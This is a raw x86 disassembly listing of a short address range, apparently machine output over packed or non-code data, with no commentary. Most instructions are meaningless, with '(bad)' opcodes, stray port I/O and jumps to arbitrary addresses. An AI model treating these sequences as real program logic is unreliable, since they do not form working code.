  415920:	and    BYTE PTR [ebp+0x5d09165b],0x93
  415927:	sbb    BYTE PTR [ecx+eax*1],ah
  41592a:	ret    0xfea
  41592d:	out    dx,al
  41592e:	pop    ebp
  41592f:	ficom  WORD PTR es:[ebp-0x64]
  415933:	cmp    eax,0x9cc0
  415938:	cmc    
  415939:	cmp    BYTE PTR [ebp+0x0],0x0
  41593d:	out    dx,eax
  41593e:	xchg   ebx,eax
  41593f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415940:	call   0x6fe0248e
  415945:	inc    esi
  415946:	mov    WORD PTR [eax+eax*1-0x31a7fb00],es
  41594d:	stos   DWORD PTR es:[edi],eax
  41594e:	cli    
  41594f:	xor    cl,BYTE PTR [esi-0x4e7172ad]
  415955:	lea    ecx,[ebx-0x2c]
  415958:	inc    esp
  415959:	add    BYTE PTR cs:[eax],al
  41595c:	push   0x7e0933dd
  415961:	cld    
  415962:	push   DWORD PTR [ecx]
  415964:	xabort 0xd7
  415967:	int3   
  415968:	pop    esi
  415969:	add    BYTE PTR [eax],al
  41596b:	adc    al,0xdb
  41596d:	and    al,0xa6
  41596f:	cmp    dl,BYTE PTR [edi+0x19]
  415972:	lock pop ss
  415974:	call   0x9624e11d
  415979:	(bad)  
  41597a:	fbld   TBYTE PTR [edx-0x4b]
  41597d:	bound  edi,QWORD PTR [esi-0x6f]
  415980:	fimul  WORD PTR [ecx+0x342f1027]
  415986:	mov    cl,0x85
  415988:	push   ss
  415989:	sbb    edx,ebp
  41598b:	sub    BYTE PTR [eax+0x7aee2cdd],bh
  415991:	fwait
  415992:	push   edi
  415993:	push   0x6c00
  415998:	fistp  QWORD PTR [eax+ecx*2+0x77]
  41599c:	add    BYTE PTR [eax],al
  41599e:	xlat   BYTE PTR ds:[ebx]
  41599f:	jmp    0x7b1f:0xfe961d98
  4159a6:	std    
  4159a7:	dec    eax
  4159a8:	push   edi
  4159a9:	add    BYTE PTR [eax],al
  4159ab:	xchg   edi,eax
  4159ac:	add    eax,esp
  4159ae:	mov    bh,0x0
  4159b0:	add    ah,al
  4159b2:	jb     0x4159b4
  4159b4:	add    BYTE PTR [ebx+esi*4+0x5acc6bdf],bh
  4159bb:	add    BYTE PTR [eax],al
  4159bd:	sub    ah,BYTE PTR [ebp+0xf2c4]
  4159c3:	(bad)
  4159c6:	add    BYTE PTR [eax],al
  4159c8:	pop    esi
  4159c9:	jae    0x41598d
  4159cb:	test   BYTE PTR [ebx+0x0],bh
  4159ce:	add    BYTE PTR [edx+0x58],ch
  4159d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159d2:	add    dh,BYTE PTR [ebp-0x43]
  4159d5:	mov    bh,0xcc
  4159d7:	rol    DWORD PTR [eax],0x0
  4159da:	pop    edi
  4159db:	call   0xd9c2026b
  4159e0:	add    BYTE PTR [eax],al
  4159e2:	xor    al,0xd6
  4159e4:	or     BYTE PTR [esi+0x0],dh
  4159e7:	add    al,dl
  4159e9:	xchg   ebp,eax
  4159ea:	popa   
  4159eb:	cdq    
  4159ec:	sub    BYTE PTR [ebp+ebx*4+0x49],dl
  4159f0:	mov    al,0xf8
  4159f2:	outs   dx,BYTE PTR ds:[esi]
  4159f3:	rcr    BYTE PTR [eax-0x2f410000],0xc7
  4159fa:	pop    edx
  4159fb:	js     0x415a1f
  4159fd:	jge    0x415a3f
  4159ff:	add    eax,DWORD PTR [eax]
  415a01:	add    BYTE PTR [edx],bl
  415a03:	push   0x30
  415a05:	xlat   BYTE PTR ds:[ebx]
  415a06:	cmp    DWORD PTR [edx+0x1a],ecx
  415a09:	cwde   
  415a0a:	repnz mov ebx,0x9539a2e9
  415a10:	ret    
  415a11:	adc    DWORD PTR [ebx-0x2cfcbdff],edx
  415a17:	xchg   ebp,ebp
  415a19:	add    eax,0x38e6acec
  415a1e:	mov    ch,0xf1
  415a20:	scas   al,BYTE PTR es:[edi]
  415a21:	shl    BYTE PTR [edi+0x11],cl
  415a24:	dec    esp
  415a25:	test   DWORD PTR [eax],eax
  415a27:	add    BYTE PTR [edi+ecx*2+0x9388e2],bl
  415a2e:	add    al,dl
  415a30:	out    dx,eax
  415a31:	lds    ebp,FWORD PTR [ecx-0x5a838be8]
  415a37:	(bad)  ds:0x8148edaa
  415a3d:	add    BYTE PTR [eax],al
  415a3f:	mov    ebx,0x82be5dee
  415a44:	daa    
  415a45:	mov    BYTE PTR [ebx],ah
  415a47:	add    BYTE PTR [eax],al
  415a49:	add    al,0x2b
  415a4b:	add    BYTE PTR [eax],al
  415a4d:	xor    al,0xc6
  415a4f:	or     al,0x8e
  415a51:	add    BYTE PTR [eax],al
  415a53:	test   eax,0x78c37251
  415a58:	and    ecx,esp
  415a5a:	dec    ebp
  415a5b:	add    BYTE PTR [eax],al
  415a5d:	cmp    dh,0x0
  415a60:	add    BYTE PTR ds:0x130874,dl
  415a66:	add    bl,ch
  415a68:	repnz (bad) 
  415a6a:	aaa    
  415a6b:	loope  0x415ab6
  415a6d:	add    eax,0x66ab2f92
  415a72:	dec    ebx
  415a73:	pop    eax
  415a74:	lods   al,BYTE PTR ds:[esi]
  415a75:	adc    DWORD PTR [eax],edi
  415a77:	nop
  415a78:	packuswb mm0,mm2
  415a7b:	test   BYTE PTR [eax+eax*1+0x0],ch
  415a7f:	push   0x5c619674
  415a84:	dec    edi
  415a85:	in     al,dx
  415a86:	mov    DWORD PTR [edx],0x2711b946
  415a8c:	cmp    ecx,esi
  415a8e:	adc    DWORD PTR [ebx-0x45549ec3],esp
  415a94:	ins    DWORD PTR es:[edi],dx
  415a95:	mov    ds,edi
  415a97:	mov    dl,0x37
  415a99:	sub    BYTE PTR [edi+0x0],0x0
  415a9d:	mov    BYTE PTR [esi-0x44710000],dh
  415aa3:	push   ss
  415aa4:	add    BYTE PTR [edx],bh
  415aa6:	add    BYTE PTR [eax],al
  415aa8:	sti    
  415aa9:	adc    DWORD PTR ds:0xf69d2b94,0xb
  415ab0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ab1:	xchg   DWORD PTR [edi],esp
  415ab3:	inc    edi
  415ab4:	sbb    DWORD PTR [ebx+eax*8-0x7a7da325],0x6
  415abc:	add    DWORD PTR [edi+esi*2-0x49e06c59],edi
  415ac3:	out    0x80,eax
  415ac5:	push   0x85970000
  415aca:	mov    bp,0x4064
  415ace:	hlt    
  415acf:	add    BYTE PTR [eax],al
  415ad1:	jecxz  0x415b00
  415ad3:	mov    BYTE PTR [esi+0x0],bl
  415ad6:	add    BYTE PTR [esi+0x7b051dad],ah
  415adc:	daa    
  415add:	mov    dh,0xb0
  415adf:	scas   eax,DWORD PTR es:[edi]
  415ae0:	inc    edx
  415ae1:	ret    0x92aa
  415ae4:	shl    BYTE PTR [ecx+eax*2+0x2e],1
  415ae8:	mov    WORD PTR [ebx],gs
  415aea:	add    BYTE PTR [eax],al
  415aec:	sbb    cl,BYTE PTR [ebx]
  415aee:	add    DWORD PTR ds:0xb98422a4,eax
  415af4:	add    BYTE PTR [eax],al
  415af6:	push   esi
  415af7:	add    eax,0x9d9cff5b
  415afc:	ss dec edi
  415afe:	adc    edi,edi
  415b00:	mov    cl,0x46
  415b02:	sub    BYTE PTR [ebx-0x23],cl
  415b05:	sbb    esp,DWORD PTR [ebp-0x36690a92]
  415b0b:	jo     0x415b35
  415b0d:	std    
  415b0e:	js     0x415b6f
  415b10:	or     al,0xfa
  415b12:	add    BYTE PTR [eax],al
  415b14:	sub    ebp,ecx
  415b16:	jns    0x415b76
  415b18:	push   ss
  415b19:	dec    ebx
  415b1a:	xlat   BYTE PTR ds:[ebx]
  415b1b:	repz neg BYTE PTR [eax+0x56e26955]
  415b22:	call   0x94737697
  415b27:	sbb    edi,0x4
  415b2a:	out    0x0,al
  415b2c:	add    cl,al
  415b2e:	xor    ebp,DWORD PTR [ebp-0x10]
  415b31:	push   ds
  415b32:	pop    esp
  415b33:	jns    0x415b4f
  415b35:	cmp    DWORD PTR [edi],0xffffffdd
  415b38:	cmp    bh,BYTE PTR [eax+ebp*1]
  415b3b:	pushf  
  415b3c:	nop
  415b3d:	and    bl,dh
  415b3f:	dec    esi
  415b40:	fistp  DWORD PTR [ecx+eax*4]
  415b43:	sahf   
  415b44:	das    
  415b45:	pop    ds
  415b46:	repz rcr DWORD PTR [edi*2+0x21d44b50],cl
  415b4e:	arpl   WORD PTR [ebp+0x65],cx
  415b51:	mov    ch,0x38
  415b53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b54:	out    dx,eax
  415b55:	(bad)  
  415b56:	push   0x46
  415b58:	outs   dx,BYTE PTR ds:[esi]
  415b59:	or     BYTE PTR [edx],bl
  415b5b:	add    BYTE PTR [eax],al
  415b5d:	cmc    
  415b5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b5f:	iret   
  415b60:	stos   BYTE PTR es:[edi],al
  415b61:	fdivr  QWORD PTR [ecx]
  415b63:	retf   0x39f3
  415b66:	jae    0x415af7
  415b68:	aad    0xa1
  415b6a:	jmp    0x44ae:0x3952685e
  415b71:	mov    ds:0x73400000,eax
  415b76:	add    BYTE PTR [eax],al
  415b78:	cmc    
  415b79:	pop    es
  415b7a:	sbb    al,0xb9
  415b7c:	fsub   QWORD PTR [ecx]
  415b7e:	mov    esi,0x19f1ff77
  415b83:	xor    al,0x40
  415b85:	dec    eax
  415b86:	add    BYTE PTR [eax],al
  415b88:	xor    eax,0x424c4ed6
  415b8d:	add    BYTE PTR [eax],al
  415b8f:	int    0xe1
  415b91:	or     cl,al
  415b93:	add    BYTE PTR [eax],al
  415b95:	jp     0x415b2c
  415b97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b98:	test   al,0xa1
  415b9a:	(bad)  
  415b9b:	cli    
  415b9c:	call   0x23a4faa8
  415ba1:	outs   dx,BYTE PTR ds:[esi]
  415ba2:	imul   ecx,DWORD PTR [eax+0x1b],0x0
  415ba6:	add    BYTE PTR [ecx],cl
  415ba8:	pop    esi
  415ba9:	xor    al,0xa9
  415bab:	fs xor bl,0x0
  415baf:	add    BYTE PTR [esi+0xa62eb27],bh
  415bb5:	in     eax,0x18
  415bb7:	xchg   edx,eax
  415bb8:	popf   
  415bb9:	leave  
  415bba:	clc    
  415bbb:	inc    esi
  415bbc:	sahf   
  415bbd:	rcl    DWORD PTR [edi-0x51],1
  415bc0:	hlt    
  415bc1:	nop
  415bc2:	add    al,0x7f
  415bc4:	add    BYTE PTR [eax],al
  415bc6:	jns    0x415ba0
  415bc8:	mov    ecx,0x49509ff5
  415bcd:	jge    0x415baa
  415bcf:	in     eax,dx
  415bd0:	outs   dx,DWORD PTR ds:[esi]
  415bd1:	out    0x85,al
  415bd3:	pop    esp
  415bd4:	cmp    bh,BYTE PTR [ecx+0x6f]
  415bd7:	gs into 
  415bd9:	mov    al,ds:0x5394c5ca
  415bde:	clc    
  415bdf:	pop    es
  415be0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415be1:	inc    esi
  415be2:	cdq    
  415be3:	icebp  
  415be4:	loope  0x415c5c
  415be6:	cwde   
  415be7:	push   cs
  415be8:	jne    0x415b83
  415bea:	adc    edi,DWORD PTR [ebx]
  415bec:	push   esp
  415bed:	add    bl,BYTE PTR [ebp+0x36]
  415bf0:	inc    esi
  415bf1:	leave  
  415bf2:	out    0xe2,eax
  415bf4:	test   BYTE PTR [eax+0x5ec70000],dl
  415bfa:	je     0x415bc5
  415bfc:	rcl    DWORD PTR [edx+0x64],0xd0
  415c00:	jo     0x415c53
  415c02:	and    eax,0xe4ddd972
  415c07:	inc    ebx
  415c08:	cmp    bl,BYTE PTR [esp+ecx*8-0x49]
  415c0c:	add    BYTE PTR [eax],al
  415c0e:	pop    ds
  415c0f:	push   esi
  415c10:	mov    WORD PTR [edi+0x0],?
  415c13:	add    cl,al
  415c15:	pushf  
  415c16:	mov    ch,0x43
  415c18:	rcr    esp,0xb5
  415c1b:	test   al,0x6e
  415c1d:	push   cs
  415c1e:	shr    DWORD PTR [eax],0x7c
  415c21:	and    dl,BYTE PTR [ebx]
  415c23:	call   0xae5d:0xf971258b
  415c2a:	imul   ebx,DWORD PTR [esi-0x6b2e30d0],0x91418bfc
  415c34:	mov    eax,0x8d16a99f
  415c39:	loope  0x415bc7
  415c3b:	add    BYTE PTR cs:[eax],al
  415c3e:	or     ah,BYTE PTR [ecx+0x3d8c]
  415c44:	sbb    eax,0x8f005616
  415c49:	add    BYTE PTR [eax],al
  415c4b:	in     al,0xf7
  415c4d:	xchg   edx,eax
  415c4e:	iret   
  415c4f:	and    eax,0x63efaa50
  415c54:	fist   DWORD PTR [esi+0x38]
  415c57:	lea    ecx,[eax+0x72]
  415c5a:	add    BYTE PTR [eax],al
  415c5c:	in     eax,dx
  415c5d:	arpl   WORD PTR [edx-0x65],dx
  415c60:	gs test eax,0xaae8b985
  415c66:	adc    dl,BYTE PTR [edx]
  415c68:	mov    bl,0xd6
  415c6a:	daa    
  415c6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c6c:	sub    DWORD PTR [eax+ebp*4-0x21],edx
  415c70:	out    0xd6,al
  415c72:	outs   dx,BYTE PTR ds:[esi]
  415c73:	fdivr  DWORD PTR [ebx]
  415c75:	and    BYTE PTR [edi-0x4d31eeca],dl
  415c7b:	dec    edi
  415c7c:	lahf   
  415c7d:	retf   0x7066
  415c80:	cdq    
  415c81:	xchg   ebx,eax
  415c82:	and    BYTE PTR [edi-0x30],ch
  415c85:	push   cs
  415c86:	push   cs
  415c87:	dec    ebx
  415c88:	lods   eax,DWORD PTR ds:[esi]
  415c89:	xchg   edx,eax
  415c8a:	push   ss
  415c8b:	push   cs
  415c8c:	iret   
  415c8d:	push   ebx
  415c8e:	ss out dx,al
  415c90:	arpl   si,dx
  415c92:	clc    
  415c93:	sbb    DWORD PTR [eax+0x61e3624d],esp
  415c99:	push   es
  415c9a:	int    0xb0
  415c9c:	mov    eax,0x644966fa
  415ca1:	adc    eax,0x90425912
  415ca6:	test   BYTE PTR [eax+eax*1+0x0],al
  415caa:	(bad)  
  415cab:	pop    ebx
  415cac:	push   ebp
  415cad:	cmp    bl,BYTE PTR [ebp+0xc]
  415cb0:	mov    bl,0x0
  415cb2:	add    BYTE PTR [ebp+0x2c],ah
  415cb5:	mov    eax,0x2909985b
  415cba:	jno    0x415d06
  415cbc:	outs   dx,BYTE PTR ds:[esi]
  415cbd:	inc    esi
  415cbe:	mov    dh,0x95
  415cc0:	jmp    0x415d2c
  415cc2:	addr16 mov ebx,0x2d84
  415cc8:	(bad)  
  415cc9:	cmp    bl,BYTE PTR [ebx-0x2b9066b9]
  415ccf:	aad    0x77
  415cd1:	rol    DWORD PTR [ecx-0x71],0xb8
  415cd5:	int3   
  415cd6:	mov    edx,0x7f790000
  415cdb:	cmp    dh,BYTE PTR ds:0xad8c
  415ce1:	sbb    BYTE PTR [ebp+0x3c01dd0d],al
  415ce7:	sbb    bh,0x0
  415cea:	add    BYTE PTR [ecx],bh
  415cec:	fsubrp st(7),st
  415cee:	ret    0x91d9
  415cf1:	cmp    dh,BYTE PTR [ebp+0x57]
  415cf4:	inc    esi
  415cf5:	xchg   edi,eax
  415cf6:	add    dl,BYTE PTR ds:0x3b6e74ca
  415cfc:	sub    esi,DWORD PTR [ebx+ebx*2+0x578c]
  415d03:	jno    0x415cac
  415d05:	cmp    al,0x7c
  415d07:	sub    edi,esp
  415d09:	dec    edx
  415d0a:	pop    ebx
  415d0b:	xchg   ebp,eax
  415d0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d0d:	iret   
  415d0e:	cmp    ch,BYTE PTR [eax+0x4c]
  415d11:	retf   
  415d12:	add    BYTE PTR [eax],al
  415d14:	cmp    BYTE PTR [edi],dl
  415d16:	pop    edi
  415d17:	js     0x415d79
  415d19:	gs push ss
  415d1b:	pop    ss
  415d1c:	inc    edi
  415d1d:	pop    ebx
  415d1e:	sub    esi,0xb9f5c7b6
  415d24:	(bad)  
  415d25:	(bad)  
  415d27:	push   edi
  415d28:	pop    eax
  415d29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d2a:	cdq    
  415d2b:	mov    edx,0xd421c3cf
  415d30:	mov    eax,0x95ebf50a
  415d35:	pop    ecx
  415d36:	jge    0x415d79
  415d38:	mov    ah,0xcb
  415d3a:	sub    al,0x14
  415d3c:	xor    eax,0xe6445c
  415d41:	add    al,bl
  415d43:	pop    ds
  415d44:	adc    eax,0x9d878fe0
  415d49:	out    dx,al
  415d4a:	in     eax,0x54
  415d4c:	cmp    BYTE PTR [edx+0x46445c],ch
  415d52:	add    ch,dl
  415d54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d55:	(bad)  
  415d56:	clc    
  415d57:	sub    BYTE PTR [ebx+ecx*2-0x5a],ah
  415d5b:	in     al,dx
  415d5c:	arpl   WORD PTR [eax-0x1bef3cba],sp
  415d62:	mov    ch,BYTE PTR [esi+0xb]
  415d65:	rcr    DWORD PTR [ebp-0x4e],1
  415d68:	ss addr16 mov esp,0xcdcffe77
  415d6f:	dec    eax
  415d70:	dec    ecx
  415d71:	add    BYTE PTR [eax],al
  415d73:	mov    esi,0xf6eb868
  415d78:	sbb    al,0xdd
  415d7a:	shl    BYTE PTR [edx+0x0],0x0
  415d7e:	mov    cl,0x25
  415d80:	add    edx,DWORD PTR [ebx]
  415d82:	arpl   di,di
  415d84:	sbb    ch,0x0
  415d87:	add    BYTE PTR [ebp-0x1],bl
  415d8a:	cs mov esi,0xaae59120
  415d90:	jnp    0x415d25
  415d92:	and    al,0x2d
  415d94:	jmp    0xe9d2:0xa9954507
  415d9b:	test   al,0x81
  415d9d:	inc    edi
  415d9e:	sar    DWORD PTR [esi],0xff
  415da1:	fwait
  415da2:	lss    edi,FWORD PTR [edx-0x14]
  415da6:	adc    esi,DWORD PTR [esi-0x3c36cda]
  415dac:	sbb    DWORD PTR [ebp+0x78],eax
  415daf:	xchg   BYTE PTR [eax-0x3cffff36],al
  415db5:	push   esp
  415db6:	(bad)  
  415db7:	push   ebp
  415db8:	enter  0x37,0x0
  415dbc:	sub    al,bl
  415dbe:	push   edx
  415dbf:	stos   DWORD PTR es:[edi],eax
  415dc0:	pop    es
  415dc1:	call   0xff2e:0xc65e8655
  415dc8:	mov    ecx,0xba8c
  415dcd:	add    eax,0x88ce424
  415dd2:	add    BYTE PTR [eax],al
  415dd4:	sbb    ebp,DWORD PTR [edx-0x78]
  415dd7:	mov    bh,0x0
  415dd9:	add    BYTE PTR [ebp-0x35754bbb],bl
  415ddf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415de0:	sub    dl,BYTE PTR [ebx+0x20bb01d1]
  415de6:	js     0x415dfe
  415de8:	mov    al,ds:0x4747d358
  415ded:	xchg   edi,eax
  415dee:	cmp    DWORD PTR [edi-0x7246a73a],0x17
  415df5:	or     al,BYTE PTR [edx+eax*1]
  415df8:	add    BYTE PTR [eax],al
  415dfa:	add    DWORD PTR [ecx],ecx
  415dfc:	gs in  al,0x7f
  415dff:	clc    
  415e00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e01:	popa   
  415e02:	pop    ebp
  415e03:	stc    
  415e04:	int    0x4f
  415e06:	sub    ch,BYTE PTR [edi]
  415e08:	mov    ecx,0xeef7b0ce
  415e0d:	fs nop
  415e0f:	dec    eax
  415e10:	push   ss
  415e11:	add    BYTE PTR [eax],al
  415e13:	dec    edi
  415e14:	imul   eax,DWORD PTR [ebp-0x8a15c9],0x31834f2c
  415e1e:	pop    ebp
  415e1f:	or     edi,DWORD PTR [edi+0x2d]
  415e22:	pop    ebx
  415e23:	cmp    al,0x1f
  415e25:	push   esp
  415e26:	dec    esp
  415e27:	les    eax,FWORD PTR [eax]
  415e29:	add    BYTE PTR [edi-0x48],dl
  415e2c:	push   es
  415e2d:	scas   eax,DWORD PTR es:[edi]
  415e2e:	mov    bh,0x4
  415e30:	adc    al,0x0
  415e32:	add    ch,bh
  415e34:	frstor [ecx+0x63dcd8e4]
  415e3a:	mov    dh,0xa1
  415e3c:	mov    ebx,0x3888
  415e41:	jcxz   0x415dea
  415e44:	pop    es
  415e45:	loop   0x415de8
  415e47:	and    eax,0xb0d5f29
  415e4c:	pop    esi
  415e4d:	sub    eax,0xd04c
  415e52:	cmp    ch,BYTE PTR [ebx+edi*2]
  415e55:	sar    BYTE PTR [eax+ebp*1+0x694adeb9],cl
  415e5c:	fdivr  DWORD PTR [edx]
  415e5e:	out    0x38,al
  415e60:	push   ebp
  415e61:	xor    eax,0xefc483
  415e66:	add    BYTE PTR [edi-0x7e50289e],ch
  415e6c:	inc    ebx
  415e6d:	pop    ds
  415e6e:	lahf   
  415e6f:	(bad)  
  415e71:	fldenv [ebx-0x2b]
  415e74:	(bad)  
  415e75:	fstp   DWORD PTR [ebp-0x62c7b645]
  415e7b:	adc    eax,0xd30fc1dd
  415e80:	fisttp WORD PTR [edx+0x4]
  415e83:	daa    
  415e84:	add    BYTE PTR [eax],al
  415e86:	pop    esi
  415e87:	sub    eax,DWORD PTR [edi+0x1a]
  415e8a:	push   ss
  415e8b:	push   esi
  415e8c:	xlat   BYTE PTR ds:[ebx]
  415e8d:	mov    ds:0xe7636a8b,eax
  415e92:	retf   
  415e93:	loopne 0x415e44
  415e95:	ror    ch,cl
  415e97:	adc    esi,DWORD PTR [eax+0x6e]
  415e9a:	fbstp  TBYTE PTR [edx+0x3b]
  415e9d:	lock add eax,0xbf1fd552
  415ea3:	inc    edx
  415ea4:	(bad)  
  415ea5:	add    DWORD PTR ss:[ecx],ebp
  415ea8:	sub    al,0x1a
  415eaa:	sahf   
  415eab:	sbb    esi,DWORD PTR [esi-0x1acb1f4b]
  415eb1:	jp     0x415eb3
  415eb3:	push   ecx
  415eb4:	add    BYTE PTR [eax],al
  415eb6:	stc    
  415eb7:	adc    bh,ch
  415eb9:	les    esi,FWORD PTR [ecx-0x21530000]
  415ebf:	sahf   
  415ec0:	stos   BYTE PTR es:[edi],al
  415ec1:	cmp    BYTE PTR [ebx+0xd],ch
  415ec4:	xor    ah,BYTE PTR [esi+0xc80069]
  415eca:	add    BYTE PTR [eax+ebp*2],dl
  415ecd:	adc    cl,BYTE PTR [ecx]
  415ecf:	ror    BYTE PTR [ecx+0x0],0x0
  415ed3:	ins    DWORD PTR es:[edi],dx
  415ed4:	cmp    al,0x58
  415ed6:	rol    DWORD PTR [edi-0x2c],0x92
  415eda:	enter  0x28,0x0
  415ede:	retf   0x76c3
  415ee1:	out    0xf9,eax
  415ee3:	sbb    dl,BYTE PTR [eax+0x5c]
  415ee6:	sbb    BYTE PTR [edi+0x1fa6d085],cl
  415eec:	call   0x26c3:0xa7547a75
  415ef3:	add    esp,edx
  415ef5:	fbstp  TBYTE PTR [esi-0x5b]
  415ef8:	hlt    
  415ef9:	repz sub BYTE PTR [edx-0xa],0x49
  415efe:	(bad)  
  415eff:	fidivr DWORD PTR [edi+0x12e0df98]
  415f05:	imul   ecx,DWORD PTR [edx],0xffffff9d
  415f08:	sub    bl,BYTE PTR [esi-0x66]
  415f0b:	cmp    DWORD PTR [edi],edi
  415f0d:	jae    0x415f04
  415f0f:	(bad)  
  415f10:	xchg   ebx,eax
  415f11:	pop    esi
  415f12:	adc    bh,BYTE PTR [esi]
  415f14:	add    eax,0xc5460e92
  415f19:	mov    al,BYTE PTR [esi]
  415f1b:	push   ebx
  415f1c:	imul   esp,DWORD PTR ds:0xf108d4b4,0x0
  415f23:	add    al,cl
  415f25:	add    eax,0x50650000
  415f2a:	ret    0xf3ad
  415f2d:	or     eax,0x879b53ea
  415f32:	int3   
  415f33:	in     al,dx
  415f34:	add    BYTE PTR [eax],al
  415f36:	fld    DWORD PTR [edx]
  415f38:	xchg   BYTE PTR [ecx],dl
  415f3a:	sub    bl,BYTE PTR [eax+0x3d]
  415f3d:	mov    ch,0x9a
  415f3f:	cli    
  415f40:	dec    ebx
  415f41:	neg    DWORD PTR [edi+edi*8-0x1ae2f63]
  415f48:	out    0x91,al
  415f4a:	das    
  415f4b:	or     BYTE PTR [edi+0x604c0000],dh
  415f51:	add    BYTE PTR [eax],al
  415f53:	scas   al,BYTE PTR es:[edi]
  415f54:	xchg   ebx,eax
  415f55:	adc    esi,DWORD PTR [esi-0x682305a2]
  415f5b:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  415f5d:	out    dx,eax
  415f5e:	inc    edx
  415f5f:	not    BYTE PTR [ebp-0x2e116547]
  415f65:	xor    ah,BYTE PTR [eax]
  415f67:	cmp    dl,BYTE PTR [ecx-0x7d]
  415f6a:	add    DWORD PTR [ebx-0x707d1409],ebx
  415f70:	dec    ebp
  415f71:	push   ds
  415f72:	sbb    DWORD PTR [ebp+0x71c7e08a],0x3b
  415f79:	loope  0x415fd6
  415f7b:	mov    eax,ds:0x989c5dfc
  415f80:	pop    es
  415f81:	clc    
  415f82:	dec    ebx
  415f83:	or     eax,0x3500
  415f88:	xor    ch,BYTE PTR [esi]
  415f8a:	mov    cl,0xd8
  415f8c:	sbb    BYTE PTR [eax-0x17],al
  415f8f:	add    BYTE PTR [eax],al
  415f91:	pop    ebx
  415f92:	inc    edi
  415f93:	adc    BYTE PTR [esi+0xc036793],cl
  415f99:	pop    ss
  415f9a:	add    BYTE PTR [eax],al
  415f9c:	sar    BYTE PTR [eax+0x4d522599],cl
  415fa2:	xor    BYTE PTR [ecx-0x4c],bl
  415fa5:	or     esi,DWORD PTR [eax]
  415fa7:	stos   DWORD PTR es:[edi],eax
  415fa8:	in     eax,0xe8
  415faa:	pop    ds
  415fab:	cmp    DWORD PTR [edx-0x7f],0xffffff8e
  415faf:	push   ds
  415fb0:	sahf   
  415fb1:	mov    edi,0xba8f46fd
  415fb6:	cdq    
  415fb7:	jle    0x415f50
  415fb9:	pusha  
  415fba:	cs (bad) 
  415fbc:	xlat   BYTE PTR ds:[ebx]
  415fbd:	shl    DWORD PTR [edx],cl
  415fbf:	cdq    
  415fc0:	xlat   BYTE PTR ds:[ebx]
  415fc1:	adc    edx,0xffffffd9
  415fc4:	cs mov bh,0x4c
  415fc7:	aad    0x0
  415fc9:	add    BYTE PTR [esi+0x5eb361a9],bl
  415fcf:	ins    DWORD PTR es:[edi],dx
  415fd0:	cmp    BYTE PTR [eax],0x85
  415fd3:	xor    esi,DWORD PTR [ecx]
  415fd5:	mov    esp,DWORD PTR [edx+0x53f916f6]
  415fdb:	cli    
  415fdc:	xor    BYTE PTR [ebx],bh
  415fde:	adc    ebp,eax
  415fe0:	retf   
  415fe1:	rol    DWORD PTR [edx+0x2f],1
  415fe4:	in     eax,0x50
  415fe6:	cmp    bh,BYTE PTR ds:0x46c119cb
  415fec:	jae    0x415fa2
  415fee:	xchg   edi,eax
  415fef:	ins    BYTE PTR es:[edi],dx
  415ff0:	fimul  WORD PTR [eax]
  415ff2:	pop    eax
  415ff3:	add    BYTE PTR [eax],al
  415ff5:	ror    BYTE PTR [esi],0x0
  415ff8:	add    BYTE PTR [eax-0x75],ah
  415ffb:	pop    edx
  415ffc:	or     ebx,esi
  415ffe:	cmp    edi,DWORD PTR [eax+0x2ed35be3]
  416004:	pushf  
  416005:	adc    eax,0xc94a5e4d
  41600a:	add    esi,DWORD PTR [ebp-0xa]
  41600d:	xchg   ch,ch
  41600f:	mov    es,ebx
  416011:	stos   BYTE PTR es:[edi],al
  416012:	outs   dx,DWORD PTR ds:[esi]
  416013:	jmp    0x691c0816
  416018:	daa    
  416019:	data16 into 
  41601b:	mov    gs,WORD PTR [esi]
  41601d:	sub    al,0xda
  41601f:	mov    ds:0x7036cfbc,eax
  416024:	mov    dl,0xa7
  416026:	xlat   BYTE PTR ds:[ebx]
  416027:	nop
  416028:	inc    eax
  416029:	mov    dh,0x0
  41602b:	add    BYTE PTR [edx+0xd740],ch
  416031:	in     eax,dx
  416032:	or     eax,0x69f9573d
  416037:	adc    BYTE PTR [eax],dh
  416039:	enter  0xbc,0x0
  41603d:	call   0xe7ce1665
  416042:	add    BYTE PTR [eax],al
  416044:	inc    ebx
  416045:	inc    edi
  416046:	mov    DWORD PTR [eax-0x26b381bb],esi
  41604c:	add    BYTE PTR [eax],al
  41604e:	cs dec ebp
  416050:	jae    0x416017
  416052:	out    0x75,eax
  416054:	icebp  
  416055:	daa    
  416056:	ror    BYTE PTR [edx+0x1a840000],0x0
  41605d:	add    BYTE PTR [ebx+ecx*8+0x0],cl
  416061:	add    BYTE PTR [esi+0x3f],ch
  416064:	sub    BYTE PTR [ebp+0xe],0xd3
  416068:	jbe    0x4160c4
  41606a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41606b:	fstp   QWORD PTR [edx+0x5bab611b]
  416071:	xor    al,0xf8
  416073:	fcomp  QWORD PTR [ecx-0x4f]
  416076:	mul    BYTE PTR [edx+edi*4-0xebd6192]
  41607d:	push   es
  41607e:	push   edx
  41607f:	outs   dx,BYTE PTR ds:[esi]
  416080:	in     al,0x3c
  416082:	int    0x2d
  416084:	mov    eax,ds:0x8ea5e64e
  416089:	inc    esp
  41608a:	push   ebp
  41608b:	add    BYTE PTR [eax],al
  41608d:	add    al,0xdb
  41608f:	add    BYTE PTR [eax],al
  416091:	pop    ebx
  416092:	adc    bh,BYTE PTR [ebx+0x56]
  416095:	fnstsw WORD PTR [eax]
  416097:	fnstenv [esi-0x4d]
  41609a:	mov    dh,0x84
  41609c:	lock add BYTE PTR [eax],al
  41609f:	call   0x87fd:0xb420c2f4
  4160a6:	daa    
  4160a7:	dec    DWORD PTR [eax+0x2a]
  4160aa:	add    BYTE PTR [eax],al
